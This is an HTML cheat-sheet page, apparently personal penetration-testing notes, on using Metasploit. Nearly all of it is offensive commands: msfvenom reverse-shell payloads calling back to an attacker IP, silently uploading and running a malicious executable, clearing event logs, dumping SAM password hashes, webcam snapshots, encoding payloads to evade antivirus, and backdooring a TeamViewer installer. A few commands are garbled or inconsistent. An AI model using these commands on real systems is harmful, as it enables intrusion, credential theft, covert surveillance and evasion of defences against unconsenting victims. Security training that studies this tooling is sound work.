<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/H4ckV4ult/styles/navBarStyles.css">
    <link rel="stylesheet" href="/H4ckV4ult/styles/walkthroughs.css">
        <link href="/H4ckV4ult/styles/prism/prism.css" rel="stylesheet" />
    <script src="/H4ckV4ult/styles/prism/prism.js"></script>
    <title>Minimalist Webpage</title>

</head>
<body>
    <div id="navbar-container"></div>
    <script src="/H4ckV4ult/components/navbar.js"></script>

    <div class="notion-container">
        <div class="notion-header">
            <h1>Metasploit</h1>
            <p>Metasploit is an open-source penetration testing framework used to identify, exploit, and validate security vulnerabilities on computer systems and networks</p>
        </div>
        <div class="notion-body">
            <h2>Capturing reverse shell</h2>
            <ul>    
                    <p>Using msfvenom create payload in base64. Adjust payload to SO and version. In this case we are using meterpreter</p>
                    <p>This will output a base64 which can be pasted in order to execute commands</p>
                    <pre><code class="language-bash">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.17 LPORT=443 -f psh-cmd</code></pre>
                    <p>Use the following plugin</p>
                    <pre><code class="language-bash">exploit/multi/handler</code></pre>
                    <p>Configure it using the same payload that you used to created in msfvenom</p>
            </ul>

            <h2>Post exploitation</h2>
            <ul>    
                <p>Once you have a established reverse shell using meterpreter you can perform some post exploitation basics</p>
                
                <pre><code class="language-bash">shell</code></pre>
                <pre><code class="language-bash">background</code></pre>
                
                <h2>Exploit suggester </h2>
                <ul>
                    <p>Use the following plugin to detect exploits on the victim machine</p>
                    <pre><code class="language-bash">meterpreter > run post/multi/recon/local_exploit_suggester</code></pre>
                </ul>

                <h2>Migrate shell</h2>
                <ul>
                    <p>Using the migrate post module, you can migrate to another process on the victim.</p>
                    <pre><code class="language-bash">meterpreter > run post/windows/manage/migrate</code></pre>
                </ul>

                <h2>Duplicate Session</h2>
                <ul>
                <p> Generate a malicious .exe file using msfvenom</p>
                <pre><code class="language-bash">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.17 LPORT=4444 -f exe -o /tmp/shell.exe</code></pre>
                <p>From the current session upload an execute the .exe file</p>
                <pre><code class="language-bash">meterpreter > upload shell.exe C:\\Windows\\Temp\\shell.exe
meterpreter > execute -f C:\\Windows\\Temp\\shell.exe -H</code></pre>
                <p>Run another listener in background </p>
                <pre><code class="language-bash">use exploit/multi/handler
exploit exploit -j -z</code></pre>
                </ul>

                <h2>Clear logs</h2>
                <ul>
                <p>From meterpreter type the following command to clear logs</p>
                <pre><code class="language-bash">meterpreter > clearev</code></pre>
                </ul>
                
                <h2>Dowload & upload</h2>
                <ul>
                <pre><code class="language-bash">meterpreter > download c:\\boot.ini</code></pre>
                <pre><code class="language-bash">meterpreter > upload evil_trojan.exe c:\\windows\\system32</code></pre>
                </ul>

                <h2>Dump hashes</h2>
                <ul>
                <p>The hashdump post module will dump the contents of the SAM database.</p>
                <pre><code class="language-bash">meterpreter > run post/windows/gather/hashdump</code></pre>
                </ul>

                <h2>Webcam list</h2>
                <ul>
                <p>The webcam_list command when run from the Meterpreter shell, will display currently available web cams on the target host.</p>
                <pre><code class="language-bash">meterpreter > webcam_list</code></pre>
                </ul>

                <h2>Webcam Snap</h2>
                <ul>
                <p>The webcam_list command when run from the Meterpreter shell, will display currently available web cams on the target host.</p>
                <pre><code class="language-bash">meterpreter > webcam_snap -h</code></pre>
                </ul>

            </ul>
            <h2>Encoding malicious files</h2>
            <ul>
                <p>Some times we generated a malicious .exe, .dll... file and we wan't to be detected by the AV. So we can ecodeit to make it harder for the victim to detect it</p>
                <p>Show available encoders</p>
                <pre><code class="language-bash">msfvenom -p windows/meterpreter/reverse_tcp --list encoders</code></pre>
                <p>Encode payload</p>
                <pre><code class="language-bash">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.17 LPORT=443 -e x64/xor -f exe -a x64 -o nc.exe</code></pre>
            </ul>

            <h2>Embed malicious code into file</h2>
            <ul>
                <p>In order to avoid IDS you can take a legit file and embed malicious code</p>
                <pre><code class="language-bash">msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5</code></pre>
            </ul>
            
            <h2>Importing modules</h2>
            <ul>
                <p>Find the module through searchsploit and grab it using -m</p>
                <pre><code class="language-bash">searchsploit -m multiple/webapps/12345.py</code></pre>
                <p>Then copy the module into the following folder</p>
                <pre><code class="language-bash">cp 12345.py /usr/share/metasploit-framework/modules/exploits</code></pre>
                <p>Start msfconsole and reload modules using</p>
                <pre><code class="language-bash">run reload_all</code></pre>
                <p>Finally use the module</p>
                <pre><code class="language-bash">use exploit/12345.rb</code></pre>
            </ul>
        </div>
    </div>
</body>
</html>